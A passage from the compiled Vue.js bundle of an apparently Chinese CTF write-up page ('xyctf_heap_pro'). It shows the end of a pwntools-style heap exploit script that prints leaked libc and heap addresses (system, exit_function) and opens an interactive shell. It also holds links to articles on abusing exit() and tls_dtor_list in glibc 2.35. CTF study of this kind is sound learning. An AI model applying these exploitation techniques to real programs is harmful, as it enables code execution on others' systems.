<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;heap_base&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base_heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_function:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_function<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;addr&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,31);function v(f,x){const a=o("ExternalLinkIcon");return c(),i("div",null,[l,n("ul",null,[k,r,n("li",null,[d,n("blockquote",null,[n("p",null,[s("大概思路:"),n("a",b,[s("exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)"),p(a)])]),n("p",null,[s("["),n("a",m,[s("原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com"),p(a)])]),h])])]),g])}const y=e(u,[["render",v],["__file","xyctf_heap_pro.html.vue"]]);export{y as default};
